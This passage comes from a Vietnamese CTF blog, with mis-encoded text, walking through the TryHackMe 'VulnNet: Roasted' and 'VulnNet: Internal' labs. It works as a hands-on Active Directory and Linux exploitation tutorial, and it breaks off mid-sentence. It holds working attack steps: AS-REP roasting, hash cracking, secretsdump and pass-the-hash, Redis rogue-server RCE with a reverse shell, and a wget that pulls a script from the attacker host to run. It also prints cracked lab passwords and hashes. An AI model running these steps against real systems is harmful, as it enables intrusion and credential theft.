10.10.15.106:49670 Open 10.10.15.106:49665 QuÃ¡ nhiá»u port Ä‘ang má»Ÿ, nhÆ°ng vÃ¬ trong intro cÅ©ng Ä‘Ã£ nÃ³i Ä‘Ã¢y lÃ  mÃ¡y Window, váº­y nÃªn tÃ´i sáº½ khai thÃ¡c port window trÆ°á»›c: 135, 139, 445, 389\nKiá»ƒm tra share file vá»›i smbclient\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbclient -L 10.10.15.106 Password for [WORKGROUP\\kali]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share VulnNet-Business-Anonymous Disk VulnNet Business Sharing VulnNet-Enterprise-Anonymous Disk VulnNet Enterprise Sharing tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.15.106 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available CÃ³ xuáº¥t hiá»‡n share file cá»§a anonymous nÃªn tÃ´i truy cáº­p vá»›i user nÃ y\nSá»­ dá»¥ng impacket\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ impacket-lookupsid anonymous@10.10.15.106 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: [*] Brute forcing SIDs at 10.10.15.106 [*] StringBinding ncacn_np:10.10.15.106[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213 498: VULNNET-RST\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: VULNNET-RST\\Administrator (SidTypeUser) 501: VULNNET-RST\\Guest (SidTypeUser) 502: VULNNET-RST\\krbtgt (SidTypeUser) 512: VULNNET-RST\\Domain Admins (SidTypeGroup) 513: VULNNET-RST\\Domain Users (SidTypeGroup) 514: VULNNET-RST\\Domain Guests (SidTypeGroup) 515: VULNNET-RST\\Domain Computers (SidTypeGroup) 516: VULNNET-RST\\Domain Controllers (SidTypeGroup) 517: VULNNET-RST\\Cert Publishers (SidTypeAlias) 518: VULNNET-RST\\Schema Admins (SidTypeGroup) 519: VULNNET-RST\\Enterprise Admins (SidTypeGroup) 520: VULNNET-RST\\Group Policy Creator Owners (SidTypeGroup) 521: VULNNET-RST\\Read-only Domain Controllers (SidTypeGroup) 522: VULNNET-RST\\Cloneable Domain Controllers (SidTypeGroup) 525: VULNNET-RST\\Protected Users (SidTypeGroup) 526: VULNNET-RST\\Key Admins (SidTypeGroup) 527: VULNNET-RST\\Enterprise Key Admins (SidTypeGroup) 553: VULNNET-RST\\RAS and IAS Servers (SidTypeAlias) 571: VULNNET-RST\\Allowed RODC Password Replication Group (SidTypeAlias) 572: VULNNET-RST\\Denied RODC Password Replication Group (SidTypeAlias) 1000: VULNNET-RST\\WIN-2BO8M1OE1M1$ (SidTypeUser) 1101: VULNNET-RST\\DnsAdmins (SidTypeAlias) 1102: VULNNET-RST\\DnsUpdateProxy (SidTypeGroup) 1104: VULNNET-RST\\enterprise-core-vn (SidTypeUser) 1105: VULNNET-RST\\a-whitehat (SidTypeUser) 1109: VULNNET-RST\\t-skid (SidTypeUser) 1110: VULNNET-RST\\j-goldenhand (SidTypeUser) 1111: VULNNET-RST\\j-leet (SidTypeUser) Thá»±c hiá»‡n láº¥y cÃ¡c user cÃ³ trong domain nÃ y tÃ´i Ä‘Æ°á»£c\nAdministrator Guest krbtgt WIN-2BO8M1OE1M1$ enterprise-core-vn a-whitehat t-skid j-goldenhand j-leet Táº¡o 1 file user.txt vÃ  nhÃ©t háº¿t chÃºng vÃ o Ä‘Ã³\nThá»±c hiá»‡n brute-force vá»›i cÃ¡c user phÃ­a trÃªn\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ impacket-GetNPUsers -dc-ip 10.10.15.106 -usersfile user.txt -no-pass vulnnet-rst.local/ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Guest doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User WIN-2BO8M1OE1M1$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User enterprise-core-vn doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User a-whitehat doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:06e72f956b790ca9f51e200ba6ba5533$85e557a35c7ce7cf1e9d648ca35799fa8e6a141a4aea843dd759a8cffae1aa642bb90eb031b5e0b68277413dcdbe4ca2c4bc55240aa9bda8401876df2a9e96991153ded0e68f46ef369f68587e2f486f4411c85730ae91b95d3cc8c351b54282d5bc52ba2268c3d529e70c83c6e16ffa85e72c596e5fadea45ea5260b8c10bcc96feee72536887d1626119e9bc96dbe8f3f9a0cf6fc3e30cd0a6b737745dd200718cf3c69314d467be57c47be6a37af19148b57c68af2544da5fd528485920f2894b2ee3594ba4c4b5f72e94bfb66bf32e3fee1f3a6918e021da7da1708607cca66dd386018d3e14968b9203179d5d06896669951ab2 [-] User j-goldenhand doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH setsmbcli [-] User j-leet doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Láº¥y Ä‘oáº¡n hash nÃ y vá» vÃ  giáº£i mÃ£ nÃ³ báº±ng john\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status tj072889* ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL) Sá»­ dá»¥ng user t-skid vÃ  pass á»Ÿ trÃªn Ä‘á»ƒ truy cáº­p smbclient\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbclient -U vulnnet-rst.local/t-skid //10.10.24.168/NETLOGON Password for [VULNNET-RST.LOCAL\\t-skid]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; DIR . D 0 Tue Mar 16 19:15:49 2021 .. D 0 Tue Mar 16 19:15:49 2021 ResetPassword.vbs A 2821 Tue Mar 16 19:18:14 2021 8771839 blocks of size 4096. 4554815 blocks available smb: \\\u0026gt; get ResetPassword.vbs /home/kali/ResetPassword.vbs getting file \\ResetPassword.vbs of size 2821 as /home/kali/ResetPassword.vbs (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec) Má»Ÿ nÃ³ ra vÃ  tÃ´i tÃ¬m tháº¥y 1 user - pass má»›i\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cat ResetPassword.vbs Option Explicit Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain Dim strUserDN, objUser, strPassword, strUserNTName \u0026#39; Constants for the NameTranslate object. Const ADS_NAME_INITTYPE_GC = 3 Const ADS_NAME_TYPE_NT4 = 3 Const ADS_NAME_TYPE_1779 = 1 If (Wscript.Arguments.Count \u0026lt;\u0026gt; 0) Then Wscript.Echo \u0026#34;Syntax Error. Correct syntax is:\u0026#34; Wscript.Echo \u0026#34;cscript ResetPassword.vbs\u0026#34; Wscript.Quit End If strUserNTName = \u0026#34;a-whitehat\u0026#34; strPassword = \u0026#34;bNdKVkjv3RR9ht\u0026#34; \u0026#39; Determine DNS domain name from RootDSE object. Set objRootDSE = GetObject(\u0026#34;LDAP://RootDSE\u0026#34;) strDNSDomain = objRootDSE.Get(\u0026#34;defaultNamingContext\u0026#34;) \u0026#39; Use the NameTranslate object to find the NetBIOS domain name from the \u0026#39; DNS domain name. Set objTrans = CreateObject(\u0026#34;NameTranslate\u0026#34;) objTrans.Init ADS_NAME_INITTYPE_GC, \u0026#34;\u0026#34; objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4) \u0026#39; Remove trailing backslash. strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1) \u0026#39; Use the NameTranslate object to convert the NT user name to the \u0026#39; Distinguished Name required for the LDAP provider. On Error Resume Next objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain \u0026amp; \u0026#34;\\\u0026#34; \u0026amp; strUserNTName If (Err.Number \u0026lt;\u0026gt; 0) Then On Error GoTo 0 Wscript.Echo \u0026#34;User \u0026#34; \u0026amp; strUserNTName _ \u0026amp; \u0026#34; not found in Active Directory\u0026#34; Wscript.Echo \u0026#34;Program aborted\u0026#34; Wscript.Quit End If strUserDN = objTrans.Get(ADS_NAME_TYPE_1779) \u0026#39; Escape any forward slash characters, \u0026#34;/\u0026#34;, with the backslash \u0026#39; escape character. All other characters that should be escaped are. strUserDN = Replace(strUserDN, \u0026#34;/\u0026#34;, \u0026#34;\\/\u0026#34;) \u0026#39; Bind to the user object in Active Directory with the LDAP provider. On Error Resume Next Set objUser = GetObject(\u0026#34;LDAP://\u0026#34; \u0026amp; strUserDN) If (Err.Number \u0026lt;\u0026gt; 0) Then On Error GoTo 0 Wscript.Echo \u0026#34;User \u0026#34; \u0026amp; strUserNTName _ \u0026amp; \u0026#34; not found in Active Directory\u0026#34; Wscript.Echo \u0026#34;Program aborted\u0026#34; Wscript.Quit End If objUser.SetPassword strPassword If (Err.Number \u0026lt;\u0026gt; 0) Then On Error GoTo 0 Wscript.Echo \u0026#34;Password NOT reset for \u0026#34; \u0026amp;vbCrLf \u0026amp; strUserNTName Wscript.Echo \u0026#34;Password \u0026#34; \u0026amp; strPassword \u0026amp; \u0026#34; may not be allowed, or\u0026#34; Wscript.Echo \u0026#34;this client may not support a SSL connection.\u0026#34; Wscript.Echo \u0026#34;Program aborted\u0026#34; Wscript.Quit Else objUser.AccountDisabled = False objUser.Put \u0026#34;pwdLastSet\u0026#34;, 0 Err.Clear objUser.SetInfo If (Err.Number \u0026lt;\u0026gt; 0) Then On Error GoTo 0 Wscript.Echo \u0026#34;Password reset for \u0026#34; \u0026amp; strUserNTName Wscript.Echo \u0026#34;But, unable to enable account or expire password\u0026#34; Wscript.Quit End If End If On Error GoTo 0 Wscript.Echo \u0026#34;Password reset, account enabled,\u0026#34; Wscript.Echo \u0026#34;and password expired for user \u0026#34; \u0026amp; strUserNTName Sá»­ dá»¥ng evil-winrm Ä‘á»ƒ khai thÃ¡c window\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo evil-winrm -i 10.10.24.168 -u a-whitehat -p \u0026#34;bNdKVkjv3RR9ht\u0026#34; [sudo] password for kali: Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents\u0026gt; dir *Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents\u0026gt; cd \\Users *Evil-WinRM* PS C:\\Users\u0026gt; dir Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/5/2022 8:57 AM a-whitehat d----- 3/13/2021 3:20 PM Administrator d----- 3/13/2021 3:42 PM enterprise-core-vn d-r--- 3/11/2021 7:36 AM Public *Evil-WinRM* PS C:\\Users\u0026gt; cd enterprise-core-vn\\Desktop *Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop\u0026gt; dir Directory: C:\\Users\\enterprise-core-vn\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/13/2021 3:43 PM 39 user.txt Privilege escalation # TÃ´i sáº½ thá»­ tÃ¬m dump cá»§a cÃ¡c user báº±ng impacket-secretsdump\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.24.168 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d::: Váº­y lÃ  tÃ´i cÃ³ hash cá»§a admin. Login thá»­ vá»›i evil-winrm\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ evil-winrm -i 10.10.24.168 -u administrator -H \u0026#34;c2597747aa5e43022a3a3049a3c3b09d\u0026#34; Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator\u0026gt; cd Desktop/ *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/13/2021 3:34 PM 39 system.txt system.txt chÃ­nh lÃ  root-flag.\n","date":"13 April 2022","externalUrl":null,"permalink":"/ctf/tryhackme/vulnnet-roasted/","section":"Ctf","summary":"","title":"Tryhackme - VulnNet: Roasted","type":"ctf"},{"content":"","date":"13 April 2022","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"8 April 2022","externalUrl":null,"permalink":"/tags/mount/","section":"Tags","summary":"","title":"Mount","type":"tags"},{"content":"","date":"8 April 2022","externalUrl":null,"permalink":"/tags/redis/","section":"Tags","summary":"","title":"Redis","type":"tags"},{"content":"","date":"8 April 2022","externalUrl":null,"permalink":"/tags/rsync/","section":"Tags","summary":"","title":"Rsync","type":"tags"},{"content":"","date":"8 April 2022","externalUrl":null,"permalink":"/tags/ssh-key/","section":"Tags","summary":"","title":"Ssh-Key","type":"tags"},{"content":"","date":"8 April 2022","externalUrl":null,"permalink":"/tags/teamcity/","section":"Tags","summary":"","title":"TeamCity","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | VulnNet: Internal\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5e278f48ae2ff889bb8913e39afd6340 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV | 256 f4fe0be25c88b563138550ddd586abbd (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE= | 256 82ea4885f02a237e0ea9d9140a602fad (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 38730/udp6 mountd | 100005 1,2,3 40715/tcp6 mountd | 100005 1,2,3 49113/tcp mountd | 100005 1,2,3 51452/udp mountd | 100021 1,3,4 42359/tcp6 nlockmgr | 100021 1,3,4 43398/udp6 nlockmgr | 100021 1,3,4 43415/tcp nlockmgr | 100021 1,3,4 49938/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) 873/tcp open rsync syn-ack (protocol version 31) 2049/tcp open nfs_acl syn-ack 3 (RPC #100227) 6379/tcp open redis syn-ack Redis key-value store 43415/tcp open nlockmgr syn-ack 1-4 (RPC #100021) 49113/tcp open mountd syn-ack 1-3 (RPC #100005) 51197/tcp open mountd syn-ack 1-3 (RPC #100005) 60935/tcp open mountd syn-ack 1-3 (RPC #100005) Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2022-11-23T02:16:00 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 23538/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 60791/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 27828/udp): CLEAN (Failed to receive data) | Check 4 (port 56651/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: vulnnet-internal | NetBIOS computer name: VULNNET-INTERNAL\\x00 | Domain name: \\x00 | FQDN: vulnnet-internal |_ System time: 2022-11-23T03:16:00+01:00 | nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | Names: | VULNNET-INTERNA\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNNET-INTERNA\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNNET-INTERNA\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 0000000000000000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 TÃ´i sáº½ báº¯t Ä‘áº§u vá»›i smb - port 139, 445. Äáº§u tiÃªn kiá»ƒm tra share folders\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbmap -H 10.10.118.210 [+] Guest session IP: 10.10.118.210:445 Name: 10.10.118.210 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers shares READ ONLY VulnNet Business Shares IPC$ NO ACCESS IPC Service (vulnnet-internal server (Samba, Ubuntu)) Truy cáº­p vÃ o thÆ° má»¥c shares\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbclient \\\\\\\\10.10.118.210\\\\shares Password for [WORKGROUP\\kali]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Tue Feb 2 04:20:09 2021 .. D 0 Tue Feb 2 04:28:11 2021 temp D 0 Sat Feb 6 06:45:10 2021 data D 0 Tue Feb 2 04:27:33 2021 11309648 blocks of size 1024. 3279224 blocks available smb: \\\u0026gt; cd temp smb: \\temp\\\u0026gt; dir . D 0 Sat Feb 6 06:45:10 2021 .. D 0 Tue Feb 2 04:20:09 2021 services.txt N 38 Sat Feb 6 06:45:09 2021 11309648 blocks of size 1024. 3279684 blocks available smb: \\temp\\\u0026gt; get services.txt /home/kali/ Error opening local file /home/kali/ smb: \\temp\\\u0026gt; scopy services.txt /home/kali/ Failed to create file \\temp\\home\\kali\\. NT_STATUS_OBJECT_PATH_NOT_FOUND smb: \\temp\\\u0026gt; get services.txt getting file \\temp\\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\temp\\\u0026gt; smb: \\temp\\\u0026gt; cd .. smb: \\\u0026gt; ls . D 0 Tue Feb 2 04:20:09 2021 .. D 0 Tue Feb 2 04:28:11 2021 temp D 0 Sat Feb 6 06:45:10 2021 data D 0 Tue Feb 2 04:27:33 2021 11309648 blocks of size 1024. 3277876 blocks available smb: \\\u0026gt; cd data smb: \\data\\\u0026gt; ls . D 0 Tue Feb 2 04:27:33 2021 .. D 0 Tue Feb 2 04:20:09 2021 data.txt N 48 Tue Feb 2 04:21:18 2021 business-req.txt N 190 Tue Feb 2 04:27:33 2021 11309648 blocks of size 1024. 3277852 blocks available smb: \\data\\\u0026gt; get data.txt getting file \\data\\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\data\\\u0026gt; get business-req.txt getting file \\data\\business-req.txt of size 190 as business-req.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\data\\\u0026gt; Má»Ÿ file services.txt trÃªn mÃ¡y local tÃ´i sáº½ cÃ³ Ä‘Æ°á»£c flag Ä‘áº§u tiÃªn.\nVá»›i 2 file cÃ²n láº¡i tÃ´i Ä‘Æ°á»£c 2 lá»i nháº¯n\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cat data.txt Purge regularly data that is not needed anymore â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cat business-req.txt We just wanted to remind you that weâ€™re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed. If you have any questions, please text or phone us. â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ KhÃ´ng cÃ²n gÃ¬ Ä‘á»ƒ khai thÃ¡c vá»›i 2 port nÃ y, tÃ´i sáº½ chuyá»ƒn sang mount\nRCE # â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ showmount -e 10.10.116.142 Export list for 10.10.116.142: /opt/conf * â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo mount -t nfs 10.10.116.142:/opt/conf /home/kali/THM-Vulnet -o nolock â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ tree THM-Vulnet THM-Vulnet â”œâ”€â”€ hp â”‚Â â””â”€â”€ hplip.conf â”œâ”€â”€ init â”‚Â â”œâ”€â”€ anacron.conf â”‚Â â”œâ”€â”€ lightdm.conf â”‚Â â””â”€â”€ whoopsie.conf â”œâ”€â”€ opt â”œâ”€â”€ profile.d â”‚Â â”œâ”€â”€ bash_completion.sh â”‚Â â”œâ”€â”€ cedilla-portuguese.sh â”‚Â â”œâ”€â”€ input-method-config.sh â”‚Â â””â”€â”€ vte-2.91.sh â”œâ”€â”€ redis â”‚Â â””â”€â”€ redis.conf â”œâ”€â”€ vim â”‚Â â”œâ”€â”€ vimrc â”‚Â â””â”€â”€ vimrc.tiny â””â”€â”€ wildmidi â””â”€â”€ wildmidi.cfg 7 directories, 12 files â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ TÃ´i sáº½ táº­p trung phÃ¢n tÃ­ch redis trÆ°á»›c vÃ¬ tÃ´i tháº¥y cÃ³ service á»Ÿ phÃ­a trÃªn, cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c gÃ¬ Ä‘Ã³, cÃ¡i gÃ¬ Ä‘Ã³ á»Ÿ Ä‘Ã¢y cÃ³ thá»ƒ password Ä‘á»ƒ truy cáº­p vÃ o service nÃ y. TÃ´i thá»­ tÃ¬m \u0026ldquo;pass\u0026rdquo; vÃ  Ä‘Ã£ cÃ³ káº¿t quáº£\nBÃ¢y giá» thÃ¬ thá»­ tÃ¬m kiáº¿m cÃ¡c cÃ¡ch khai thÃ¡c vá»›i redis\n6379 - Pentesting Redis - HackTricks\nSá»­ dá»¥ng Redis Rogue Server Ä‘á»ƒ táº¡o RCE\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/redis-rogue-server] â””â”€$ python redis-rogue-server.py --rhost 10.10.116.142 --lhost 10.6.0.191 --lport 2402 --passwd B65Hx562F@ggAZ@F ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ \u0026#39;__\\ \\ / / _ \\ \u0026#39;__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig [info] TARGET 10.10.116.142:6379 [info] SERVER 10.6.0.191:2402 [info] Setting master... [info] Authenticating... [info] Setting dbfilename... [info] Loading module... [info] Temerory cleaning up... What do u want, [i]nteractive shell or [r]everse shell: r [info] Open reverse shell... Reverse server address: Äáº¿n bÆ°á»›c nÃ y, trÆ°á»›c khi nháº­p address, tÃ´i sáº½ táº¡o listener vá»›i port 9001\nnc -lnvp 9001\nSau Ä‘Ã³ thÃ¬ nháº­p IP vÃ  port cá»§a mÃ¡y local cá»§a tÃ´i\nReverse server address: 10.6.0.191 Reverse server port: 9001 [info] Reverse shell payload sent. [info] Check at 10.6.0.191:9001 [info] Unload module... Quay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.116.142] 53768 id uid=112(redis) gid=123(redis) groups=123(redis) User flag # Äá»ƒ Ä‘á»¡ máº¥t thá»i gian thÃ¬ tÃ´i quyáº¿t Ä‘á»‹nh táº£i linPEAS lÃªn machine.\nTáº¡o local http server á»Ÿ thÆ° má»¥c chá»©a file linpeas.sh\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ python -m http.server 9001 Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ... ThÆ° má»¥c /tmp cÃ³ toÃ n quyá»n thá»±c thi nÃªn tÃ´i sáº½ táº£i file lÃªn thÆ° má»¥c nÃ y, thay Ä‘á»•i quyá»n vÃ  cháº¡y nÃ³\nredis@vulnnet-internal:/$ cd tmp cd tmp redis@vulnnet-internal:/tmp$ wget http://10.6.0.191:9001/linpeas.sh wget http://10.6.0.191:9001/linpeas.sh --2022-11-23 09:04:33-- http://10.6.0.191:9001/linpeas.sh Connecting to 10.6.0.191:9001... connected. HTTP request sent, awaiting response... 200 OK Length: 827827 (808K) [text/x-sh] Saving to: \u0026#39;linpeas.sh\u0026#39; linpeas.sh 100%[===================\u0026gt;] 808.42K 355KB/s in 2.3s 2022-11-23 09:04:36 (355 KB/s) - \u0026#39;linpeas.sh\u0026#39; saved [827827/827827] redis@vulnnet-internal:/tmp$ redis@vulnnet-internal:/tmp$ chmod +x linpeas.sh chmod +x linpeas.sh redis@vulnnet-internal:/tmp$ ./linpeas.sh Quay láº¡i 1 chÃºt thÃ´ng tin vá» mÃ¡y nÃ y thÃ¬ á»Ÿ pháº§n hint cá»§a flag thá»© 2 chá»‰ ra ráº±ng flag náº±m trong 1 file db. Sau khi linpeas cháº¡y xong thÃ¬ tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 file rdb bÃªn trong redis\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting GROUP writable files (not in Home) (max 500) â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files Group redis: /tmp/linpeas.sh /run/redis/redis-server.pid /var/log/redis/redis-server.log.1.gz /var/log/redis/redis-server.log /var/lib/redis/dump.rdb Má»Ÿ file nÃ y thÃ¬ tÃ´i cÃ³ flag thá»© 2 vÃ  1 public key\nTuy nhiÃªn cÅ©ng á»Ÿ file nÃ y, tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 Ä‘oáº¡n code khÃ¡ láº¡, 